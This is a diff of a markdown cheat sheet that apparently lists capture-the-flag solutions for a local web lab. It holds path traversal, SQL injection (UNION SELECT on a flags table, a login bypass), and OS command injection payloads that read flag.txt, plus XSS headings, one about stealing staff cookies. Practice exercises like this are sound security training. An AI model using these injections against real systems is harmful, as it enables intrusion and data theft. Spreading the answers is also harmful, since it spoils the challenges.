@@ -4,16 +4,11 @@
 
 Visit http://localhost:3001/?loc=..%2f..%2fdocument%2finsp3ct0r_g4dg3t_456afbc.ht.htmlml
 
-## SQLi: basic
-
-Username: admin'; --
-Password: anything
-
 ## SQLI: Worker's Union
 
 Query: `' UNION SELECT flag, null FROM flags;--`
 
-## XSS: Reflection
+## XSS: Basic
 
 ```html
 <script>
@@ -21,13 +16,11 @@ Query: `' UNION SELECT flag, null FROM flags;--`
 </script>
 ```
 
-# OS Command injection: basic
+# OS Command injection: Safe-Cmd
 
-To list the folder
-`; ls #!`
-
-To read the flag file
-`; cat flag.txt #!`
+```bash
+;cat<flag.txt;#
+```
 
 ## XSS: Getting the staff cookies
 
